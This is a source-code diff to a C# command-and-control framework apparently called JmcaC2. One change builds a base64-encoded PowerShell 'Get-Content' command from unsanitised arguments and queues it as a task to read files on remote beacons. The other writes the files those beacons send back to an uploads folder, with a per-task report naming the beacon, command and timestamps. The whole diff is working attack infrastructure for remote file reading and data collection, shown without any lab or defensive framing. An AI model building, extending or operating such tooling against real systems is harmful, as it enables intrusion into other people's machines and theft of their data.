@@ -146,7 +146,8 @@ namespace JmcaC2
                         break;
                     case "file":
                         {   
-                            string encoded = EncodePowershellScript("read-file.ps1");
+                            byte[] bytes = Encoding.Unicode.GetBytes("Get-Content -Path " + CmdArgs);
+                            string encoded = Convert.ToBase64String(bytes);
                             CreateTask("file", encoded);
                         }
                         break;
@@ -439,11 +440,23 @@ namespace JmcaC2
                                 Directory.CreateDirectory("uploads");
                             }
                             // write out the data file
-                            File.WriteAllBytes("uploads\\" + fileName + ".data", bytes);
+                            string dataFilePath = "uploads\\" + fileName + ".data";
+                            string reportPath = "uploads\\" + fileName + ".report";
+                            File.WriteAllBytes(dataFilePath, bytes);
 
                             // write out the report file for the task
                             if (task != null) {
-                                File.WriteAllText("uploads\\" + fileName + ".report", task.ToString() + "\n Data file: uploads\\" + fileName + ".data");
+                                string[] lines =
+                                [
+                                    "Task #" + task.Index,
+                                    "Beacon Name: " + task.Name,
+                                    "Command: " + task.Cmd,
+                                    "Data: " + task.Data,
+                                    "Data file path: " + dataFilePath,
+                                    "Task Created on: " + task.CreatedAt.ToString(),
+                                    "Task Completed on: " + DateTime.Now.ToString(),
+                                ];
+                                File.WriteAllLines(reportPath, lines);
                             }
                         }
                         else
